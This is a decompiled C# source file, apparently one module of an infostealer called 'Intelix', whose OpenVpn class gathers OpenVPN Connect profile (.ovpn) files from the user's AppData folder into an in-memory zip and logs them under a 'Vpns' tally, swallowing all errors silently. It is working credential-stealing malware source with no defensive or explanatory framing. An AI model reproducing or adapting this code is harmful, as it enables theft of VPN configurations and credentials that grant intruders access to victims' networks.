using System;
using System.IO;
using System.Threading.Tasks;
using Intelix.Helper.Data;

namespace Intelix.Targets.Vpn
{
	// Token: 0x0200000F RID: 15
	public class OpenVpn : ITarget
	{
		// Token: 0x06000031 RID: 49 RVA: 0x00003024 File Offset: 0x00001224
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OpenVPN Connect", "profiles");
			bool flag = !Directory.Exists(text);
			if (!flag)
			{
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "OpenVPN";
				Parallel.ForEach<string>(Directory.GetFiles(text), delegate(string file)
				{
					try
					{
						bool flag2 = !(Path.GetExtension(file) != ".ovpn");
						if (flag2)
						{
							string entryPath = "OpenVpn\\" + Path.GetFileName(file);
							zip.AddFile(entryPath, File.ReadAllBytes(file));
						}
					}
					catch
					{
					}
				});
				counterApplications.Files.Add(text + " => OpenVpn");
				counterApplications.Files.Add("OpenVpn\\");
				counter.Vpns.Add(counterApplications);
			}
		}
	}
}
